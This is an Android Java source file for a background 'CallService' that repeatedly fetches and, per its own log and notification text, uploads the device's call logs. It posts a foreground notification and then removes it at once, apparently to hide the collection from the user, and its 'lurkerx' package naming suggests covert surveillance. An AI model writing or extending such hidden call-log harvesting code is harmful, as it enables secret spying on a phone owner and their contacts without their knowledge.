package com.lurkerx.gpsjob.calljob;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class CallService extends Service {

    private static final String TAG = "CallService";
    private static final String CHANNEL_ID = "call_channel";
    private static final int NOTIF_ID = 102;

    private static final long SERVICE_DURATION_MS = 5 * 60_000;
    private Handler handler;
    private Runnable fetchTask;
    private CallFetch callFetch;

    @Override
    public void onCreate() {
        super.onCreate();

        callFetch = new CallFetch(this);
        handler = new Handler(Looper.getMainLooper());
        fetchTask = new Runnable() {
            @Override
            public void run() {
                try {
                    Log.d(TAG, "Fetching call logs...");
                    callFetch.fetchCalls();
                } catch (Exception e) {
                    Log.e(TAG, "Error fetching or uploading calls", e);
                }
                handler.postDelayed(this, 60_000);
            }
        };
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForegroundServiceSafe(true);
        handler.post(fetchTask);
        handler.postDelayed(this::stopSelf, SERVICE_DURATION_MS);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        handler.removeCallbacks(fetchTask);
        Log.d(TAG, "CallService stopped");
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void startForegroundServiceSafe(boolean demoteAfterStart) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Call Background Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Call Service Running")
                .setContentText("Collecting and uploading call logs")
                .setSmallIcon(android.R.drawable.sym_action_call)
                .setOngoing(true)
                .build();

        startForeground(NOTIF_ID, notification);

        if (demoteAfterStart) {
            stopForeground(true);
        }
    }
    private void startForegroundServiceSafe() {
        startForegroundServiceSafe(false);
    }

}
